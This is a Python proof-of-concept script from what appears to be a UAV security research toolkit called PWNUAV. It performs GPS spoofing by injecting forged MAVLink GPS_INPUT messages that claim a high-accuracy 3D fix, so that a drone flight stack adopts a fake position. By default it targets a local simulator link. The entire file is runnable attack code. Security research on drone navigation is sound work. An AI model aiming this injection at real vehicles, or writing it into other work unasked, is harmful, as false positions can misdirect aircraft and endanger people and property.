"""PoC 04 (virtual) - GPS spoofing via GPS_INPUT injection (PWNUAV NV-01, IM-03).

No GPS hardware: injects a forged MAVLink GPS_INPUT so the flight stack adopts a
fake position. Virtual equivalent of an over-the-air L1 overdrive, which would
require an instrumented receiver that is not available here.
"""
from __future__ import annotations

import argparse
import time

from pwnuav.link import announce, connect


def spoof_position(master, lat: float, lon: float, alt: float,
                   target_system: int = 1, target_component: int = 1) -> None:
    master.mav.gps_input_send(
        int(time.time() * 1e6), 0,          # time_usec, gps_id
        0,                                   # ignore_flags (0 = use all fields)
        0, 0,                                # time_week_ms, time_week
        3,                                   # fix_type = 3D
        int(lat * 1e7), int(lon * 1e7), float(alt),  # lat, lon (1e7), alt (m)
        1.0, 1.0,                            # hdop, vdop
        0.0, 0.0, 0.0,                       # vn, ve, vd
        0.5, 1.0, 1.0,                       # speed/horiz/vert accuracy
        12,                                  # satellites_visible
    )


def main() -> None:
    ap = argparse.ArgumentParser(description="PWNUAV PoC 04 - virtual GPS spoofing")
    ap.add_argument("--connect", default="udpout:127.0.0.1:14550")
    ap.add_argument("--lat", type=float, default=6.2518)
    ap.add_argument("--lon", type=float, default=-75.5636)
    ap.add_argument("--alt", type=float, default=1500.0)
    ap.add_argument("--count", type=int, default=20)
    args = ap.parse_args()
    master = connect(args.connect)
    announce(master)
    master.wait_heartbeat(timeout=10)
    print(f"[*] Injecting forged GPS_INPUT: {args.lat},{args.lon},{args.alt} m")
    for _ in range(args.count):
        spoof_position(master, args.lat, args.lon, args.alt)
        time.sleep(0.1)
    master.close()
    print("[+] Spoofing sent")


if __name__ == "__main__":
    main()
